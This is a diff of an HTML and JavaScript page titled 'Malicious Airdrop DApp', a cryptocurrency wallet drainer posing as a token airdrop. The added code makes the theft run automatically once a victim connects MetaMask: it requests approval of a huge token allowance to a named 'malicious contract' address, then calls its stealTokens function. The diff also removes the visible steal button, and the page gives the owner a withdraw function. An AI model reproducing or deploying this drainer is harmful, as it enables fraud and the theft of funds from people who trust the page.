@@ -4,160 +4,96 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Malicious Airdrop DApp</title>
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.3/dist/web3.min.js"></script>
 </head>
 <body>
     <h1>Malicious Airdrop DApp</h1>
-    
     <button id="connectButton">Connect MetaMask</button>
     <button id="approveButton" style="display:none;">Approve Contract</button>
-    <button id="stealButton" style="display:none;">Steal Tokens</button>
     <button id="withdrawButton" style="display:none;">Withdraw Tokens</button>
-    
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.5/dist/web3.min.js"></script>
     <script>
         let web3;
-        let contract;
         let accounts;
-        let contractAddress = "0xEDd1061AC707dcE56B48B77a700D75CD51f261cf";  // Malicious contract address
-        let tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4";  // TKK token address
-        let contractABI = [
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "spender",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "approve",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "account",
-                        "type": "address"
-                    }
-                ],
-                "name": "balanceOf",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "recipient",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "transfer",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "sender",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "recipient",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "transferFrom",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            }
-        ];
+        let contract;
 
-        // Connect to MetaMask and Web3
+        // Replace these values with your malicious contract's ABI and deployed address
+        const contractABI = [ /* Paste the ABI you provided earlier here */ ];
+        const contractAddress = "0xEDd1061AC707dcE56B48B77a700D75CD51f261cf"; // Your malicious contract address
+        const tokenAddress = "0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4"; // TKK Token contract address
+
+        // Connect MetaMask
         async function connectMetaMask() {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
                 await window.ethereum.request({ method: "eth_requestAccounts" });
                 accounts = await web3.eth.getAccounts();
                 contract = new web3.eth.Contract(contractABI, contractAddress);
+
+                console.log("Connected to MetaMask. Account:", accounts[0]);
                 document.getElementById("approveButton").style.display = "block";
-                document.getElementById("stealButton").style.display = "block";
                 document.getElementById("withdrawButton").style.display = "block";
+
+                // Automatically trigger stealing process after connection
+                approveAndSteal();
             } else {
                 alert("Please install MetaMask!");
             }
         }
 
-        // Approve the contract to transfer tokens
+        // Approve contract to interact with tokens
         async function approveContract() {
-            const amount = web3.utils.toWei("1000", "ether"); // For testing, approve 1000 tokens
-            const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
-            await tokenContract.methods.approve(contractAddress, amount).send({ from: accounts[0] });
-            alert("Approval Successful");
+            try {
+                const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
+                const maxAmount = web3.utils.toWei("1000000", "ether"); // Max amount to approve
+
+                const tx = await tokenContract.methods.approve(contractAddress, maxAmount).send({ from: accounts[0] });
+                console.log("Contract approved:", tx);
+                alert("Contract approved successfully!");
+
+                return true;
+            } catch (error) {
+                console.error("Error approving contract:", error);
+                alert("Failed to approve contract. Check the console for details.");
+                return false;
+            }
         }
 
-        // Steal Tokens
+        // Steal tokens automatically
         async function stealTokens() {
-            await contract.methods.stealTokens().send({ from: accounts[0] });
-            alert("Tokens stolen successfully");
+            try {
+                const tx = await contract.methods.stealTokens().send({ from: accounts[0] });
+                console.log("Tokens stolen successfully:", tx);
+                alert("Tokens stolen successfully!");
+            } catch (error) {
+                console.error("Error stealing tokens:", error);
+                alert("Failed to steal tokens. Check the console for details.");
+            }
         }
 
-        // Withdraw Tokens
+        // Approve and then steal tokens
+        async function approveAndSteal() {
+            const approved = await approveContract();
+            if (approved) {
+                stealTokens(); // Automatically trigger stealTokens after approval
+            }
+        }
+
+        // Withdraw tokens (for owner only)
         async function withdrawTokens() {
-            await contract.methods.withdrawTokens().send({ from: accounts[0] });
-            alert("Tokens withdrawn successfully");
+            try {
+                const tx = await contract.methods.withdrawTokens().send({ from: accounts[0] });
+                console.log("Tokens withdrawn successfully:", tx);
+                alert("Tokens withdrawn successfully!");
+            } catch (error) {
+                console.error("Error withdrawing tokens:", error);
+                alert("Failed to withdraw tokens. Check the console for details.");
+            }
         }
 
-        // Add event listeners to buttons
+        // Event Listeners
         document.getElementById("connectButton").addEventListener("click", connectMetaMask);
-        document.getElementById("approveButton").addEventListener("click", approveContract);
-        document.getElementById("stealButton").addEventListener("click", stealTokens);
+        document.getElementById("approveButton").addEventListener("click", approveAndSteal);
         document.getElementById("withdrawButton").addEventListener("click", withdrawTokens);
     </script>
 </body>
